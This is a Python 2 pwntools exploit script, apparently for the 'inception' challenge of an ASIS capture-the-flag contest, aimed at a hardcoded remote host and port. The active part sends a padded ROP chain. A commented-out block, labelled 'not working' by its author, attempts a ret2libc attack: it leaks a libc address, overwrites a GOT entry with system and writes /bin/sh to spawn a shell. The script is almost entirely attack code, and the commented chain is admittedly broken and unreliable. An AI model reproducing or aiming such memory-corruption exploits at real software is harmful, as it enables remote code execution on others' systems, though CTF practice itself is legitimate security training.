#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('inception')

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

host = args.HOST or '37.139.17.37'
port = int(args.PORT or 1338)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
    else:
        return process([exe.path] + argv, env = env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
set follow-fork-mode child
break *0x400C80
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()

rop = ROP(exe)
rop.puts

stage1 = 'ASIS{N0T_R34LLY_4_FL4G}\x00' + cyclic(16) + rop.chain()
with open('input', 'wb') as f: f.write(stage1)
io.sendlineafter('something: ', stage1)
io.sendline('test')

"""
not working
rop.puts(0x400D18)
rop.puts(exe.got['puts'])
rop.read(0, exe.got['setvbuf'])
rop.read(0, 0x6020C0) # overwrite stdout with some bss address
rop.read(0, 0x6020D0) # write /bin/sh\x00 to that addr
rop.raw(0x400A27)


log.info(rop.dump())
log.info(len(rop.chain()))

stage1 = 'ASIS{N0T_R34LLY_4_FL4G}\x00' + cyclic(16) + rop.chain()
with open('input', 'wb') as f: f.write(stage1)
io.sendlineafter('something: ', stage1)
io.recvuntil('ASIS{N0T_R34LLY_4_FL4G}\n')
addr = io.recvuntil('\n').strip()
addr = u64(addr + "\x00" * 2)
log.info(hex(addr))

libc = ELF('./libc.so.6')
libc.addr = addr - libc.symbols['puts']
log.info(hex(libc.addr))
log.info(hex(libc.addr + libc.symbols['system']))
io.send(p64(libc.addr + libc.symbols['system']))
io.send(p64(0x6020D0))
io.send('/bin/sh\x00')
"""

io.interactive()

